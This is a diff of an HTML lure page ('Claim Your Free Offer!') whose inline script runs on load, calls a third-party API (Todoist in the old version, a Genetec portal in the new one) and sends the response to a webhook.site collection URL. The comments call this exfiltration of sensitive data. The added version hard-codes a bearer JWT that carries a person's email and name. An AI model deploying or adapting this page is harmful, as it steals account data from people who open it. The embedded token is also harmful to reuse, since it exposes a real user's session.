@@ -7,22 +7,23 @@
 <body>
   <h1>Claim Your Free Offer!</h1>
   <script>
-    var req = new XMLHttpRequest();
-    req.open('POST', 'https://app.todoist.com/api/v9.210/sync', true);
-    req.withCredentials = true; // Send cookies
-    req.setRequestHeader('Content-Type', 'application/json'); // Ensures request is accepted
-    req.send('{}'); // Sending an empty JSON body
+   var req = new XMLHttpRequest();
+req.open('GET', 'https://www.genetec.com/resourceapi/portal/contact-registration', true);
+req.setRequestHeader('Authorization', 'Bearer eyJhbGciOiJIUzUxMiJ9.eyJzdWIiOiJjZWxhaGkxMDk3QGVyYXBrLmNvbSIsInNjb3BlcyI6W10sImJhc2VJbmZvIjp7IndlYlJvbGVJZCI6W10sImdlbl9wb3J0YWx1c2VycmVnaXN0cmF0aW9uc3RhdHVzIjoxLCJmaXJzdG5hbWUiOiJUaGFub3MiLCJnZW5fam9ibGV2ZWwiOm51bGwsImFkZHJlc3MxX2NpdHkiOm51bGwsImFkZHJlc3MxX3N0YXRlb3Jwcm92aW5jZSI6bnVsbCwiam9idGl0bGUiOm51bGwsImN1c3RvbWVydHlwZWNvZGUiOm51bGwsImNvbnRhY3RpZCI6ImI4NWNmMjQxLWJlMDAtZjAxMS1iYWUzLTAwMjI0OGFmOGExOSIsImdlbl9wb3J0YWxub3RpZmljYXRpb25zZXR0aW5ncyI6dHJ1ZSwidGVsZXBob25lMSI6bnVsbCwiZ2VuX2pvYmZ1bmN0aW9uIjpudWxsLCJzdGF0ZWNvZGUiOjAsImFkZHJlc3MxX3Bvc3RhbGNvZGUiOm51bGwsImVtYWlsYWRkcmVzczEiOiJjZWxhaGkxMDk3QGVyYXBrLmNvbSIsImxhc3RuYW1lIjoiTGVnZW5kIiwic3RhdHVzY29kZSI6MSwiYWRkcmVzczFfY291bnRyeSI6bnVsbCwiaWRwIjoiOWdGZVJ3QjFncng4WnpWYXhYRXJ0MUp2WkhzYXRsZzhNLTVSZzlwYkJkYkdQa2l2Zl9oMnBhbG9KeV9tdllOazVSM0VkMlVqdUlDaVhJTlhXX0dTMGI1OUhTNHkwSDFfT1gtc0ktYXBCWWMiLCJhZGRyZXNzMV9saW5lMSI6bnVsbCwid2ViUm9sZU5hbWUiOltdLCJnZW5fcG9ydGFscHJpdmFjeWNvbnNlbnQiOm51bGwsImFkZHJlc3MxX2xpbmUyIjpudWxsLCJnZW5fYmV0YXBhcnRpY2lwYW50c3RhdHVzIjpmYWxzZX0sInJvbGVzIjpbXSwiaXNzIjoiaHR0cHM6Ly93d3cuZ2VuZXRlYy5jb20iLCJpYXQiOjE3NDE5NDc3ODgsImV4cCI6MTc0MTk1MTMyOH0.wHf-hASwks7PwxpOIly81ryWeO3dkNwQQILg_GWRLQ_HnRSQg9lrcQrHBTGEk-SFDT_eyz975G5sn2Li3yU48g'); // Bearer token for authentication
+req.setRequestHeader('Content-Type', 'application/json'); // Ensures request is accepted
+req.send('{}'); // Sending an empty JSON body
 
-    req.onload = function() {
-      if (req.status === 200) {
-        // Exfiltrate sensitive data to an external server
-        var exfil = new XMLHttpRequest();
-        exfil.open("GET", "https://webhook.site/762bc04b-b26f-4433-9a92-7cfd4ae6e9ad?data=" + encodeURIComponent(req.responseText), true);
-        exfil.send();
-      } else {
-        console.error("Request failed with status: " + req.status);
-      }
-    };
+req.onload = function() {
+  if (req.status === 200) {
+    // Exfiltrate response (only in legal testing environments)
+    var exfil = new XMLHttpRequest();
+    exfil.open("GET", "https://webhook.site/09ad03a9-0c32-45d0-bed7-e839d575c217?data=" + encodeURIComponent(req.responseText), true);
+    exfil.send();
+  } else {
+    console.error("Request failed with status: " + req.status);
+  }
+};
+
   </script>
 </body>
 </html>
